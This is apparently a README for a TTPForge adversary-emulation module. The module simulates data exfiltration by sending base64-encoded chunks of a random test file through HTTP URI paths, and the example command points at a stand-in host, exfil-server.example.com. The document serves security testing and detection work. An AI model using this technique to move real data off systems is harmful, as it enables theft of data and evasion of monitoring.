# HTTP URI data exfiltration

## Description
This TTP creates a random 3.9MB file and exfiltrates it by sending base64-encoded chunks as part of the HTTP URI path. It uses a compiled Go client to perform the exfiltration.

## Arguments
- **domain**: The domain to use for HTTP data exfiltration (e.g., `blahblah.com`).

## Requirements
1. Linux platform.
2. Go toolchain installed for building the client binary.
3. An HTTP server running at the specified domain to receive the exfiltrated data.

## Examples
You can run this TTP with the following command:
```bash
ttpforge run forgearmory//exfiltration/http-uri-exfil/ttp.yaml \
  --arg domain=exfil-server.example.com
```

## Steps
1. **replace_placeholder**: Injects the target domain into the Go source file.
2. **generate_random_file**: Generates a random 3.9MB test file for exfiltration.
3. **build_golang_client**: Builds the Go exfiltration client binary.
4. **execute_binary**: Executes the compiled binary to exfiltrate the test file. Cleans up the binary and test file on completion.
